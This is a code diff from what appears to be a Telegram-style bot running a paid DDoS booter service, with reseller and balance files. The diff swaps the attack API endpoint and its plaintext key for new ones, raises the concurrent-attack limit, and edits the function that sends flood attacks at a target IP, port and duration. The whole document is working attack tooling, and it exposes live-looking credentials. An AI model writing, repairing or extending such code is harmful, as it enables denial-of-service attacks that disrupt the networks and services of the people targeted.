@@ -27,8 +27,8 @@ CO_OWNERS_FILE = "co_owners.json"
 # ═══════════════════════════════════════════════════
 # 🔥 API CONFIGURATION - FIXED
 # ═══════════════════════════════════════════════════
-API_URL = "http://api.godstress.site/api/v1/attack/start"
-API_KEY = "nk_be50d5867322d60f50c800212ed9c78d"
+API_URL = "http://54.163.45.50:8585/attack"
+API_KEY = "sxngqbDHdOgm317knmqEjOI0DBqJD30A"
 API_METHOD = "UDP-BIG"  # Display method only
 DISPLAY_METHOD = "Game-PPS"
 
@@ -41,7 +41,7 @@ RESELLER_FILE = "resellers.json"
 BALANCE_FILE = "balances.json"
 BANNED_FILE = "banned_users.json"
 
-MAX_CONCURRENT_ATTACKS = 2
+MAX_CONCURRENT_ATTACKS = 3
 MAX_ATTACK_DURATION = 300
 COOLDOWN_SECONDS = 120
 
@@ -575,7 +575,7 @@ def send_api_attack(target, port, duration):
     """FIXED: Direct API call with new API endpoint"""
     try:
         # Updated API URL with provided key
-        url = f"{API_URL}?key={API_KEY}&ip={target}&port={port}&time={duration}&method={API_METHOD}"
+        url = f"{API_URL}?key={API_KEY}&ip={target}&port={port}&time={duration}"
         
         response = requests.get(
             url,
